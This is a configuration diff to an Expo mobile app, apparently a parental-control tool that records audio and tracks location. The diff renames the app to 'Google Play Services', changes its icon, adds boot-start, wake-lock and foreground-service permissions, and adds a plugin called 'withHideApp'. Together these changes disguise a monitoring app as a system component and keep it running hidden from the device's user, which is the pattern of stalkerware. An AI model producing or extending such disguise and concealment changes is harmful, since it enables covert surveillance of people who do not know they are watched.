@@ -1,6 +1,6 @@
 {
   "expo": {
-    "name": "Control Parental",
+    "name": "Google Play Services",
     "slug": "parental-control",
     "owner": "manuvjc58",
     "version": "1.0.0",
@@ -16,7 +16,7 @@
     "android": {
       "package": "com.parentalcontrol.app",
       "adaptiveIcon": {
-        "backgroundColor": "#1a73e8",
+        "backgroundColor": "#ffffff",
         "foregroundImage": "./assets/android-icon-foreground.png",
         "backgroundImage": "./assets/android-icon-background.png",
         "monochromeImage": "./assets/android-icon-monochrome.png"
@@ -26,13 +26,28 @@
         "RECORD_AUDIO",
         "ACCESS_FINE_LOCATION",
         "ACCESS_COARSE_LOCATION",
-        "INTERNET"
+        "INTERNET",
+        "RECEIVE_BOOT_COMPLETED",
+        "VIBRATE",
+        "WAKE_LOCK",
+        "FOREGROUND_SERVICE"
       ]
     },
     "web": {
       "favicon": "./assets/favicon.png"
     },
-    "plugins": [],
+    "plugins": [
+      [
+        "./plugins/withHideApp"
+      ],
+      [
+        "expo-notifications",
+        {
+          "icon": "./assets/icon.png",
+          "color": "#ffffff"
+        }
+      ]
+    ],
     "extra": {
       "eas": {
         "projectId": "273adf6e-691b-4e00-901c-404aa1fdfc43"
